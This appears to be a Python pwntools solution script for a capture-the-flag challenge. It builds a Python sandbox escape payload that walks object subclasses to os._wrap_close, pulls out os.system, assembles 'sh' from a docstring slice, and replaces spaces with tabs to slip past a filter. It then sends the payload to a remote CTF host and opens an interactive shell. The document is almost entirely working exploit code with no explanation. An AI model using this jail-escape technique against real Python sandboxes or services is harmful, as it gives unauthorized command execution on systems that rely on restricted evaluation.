# inspiration from https://codegolf.stackexchange.com/a/264375
# and https://github.com/SuperStormer/writeups/tree/master/redpwnctf_2020/misc/albatross
from pwn import *

def gen_int(i):
	if i == 0:
		return "False"
	else:
		return "+".join(["True"] * i)

def call_function(f, arg):
	return (f"[[None for _.__class_getitem__ in [{f}]],"
		f"_[{arg}]][True]")

type_s = "_.__class__"
object_s = "_.__base__"
subclasses = call_function(type_s + ".__subclasses__", object_s)
wrap_close = f"{subclasses}[{gen_int(140)}]"
os_module = f"{wrap_close}.__init__.__globals__"

system_s = f"[*{os_module}][{gen_int(46)}]"

system_f = f"{os_module}[{system_s}]"

sh_s = f"[].__doc__[{gen_int(91)}:{gen_int(97)}:{gen_int(5)}]"

system_sh = call_function(system_f, sh_s).replace(' ', '\t')

s = remote("ctf.tcp1p.com", 45214)
s.sendlineafter(b">>> ", system_sh.encode())
s.interactive()
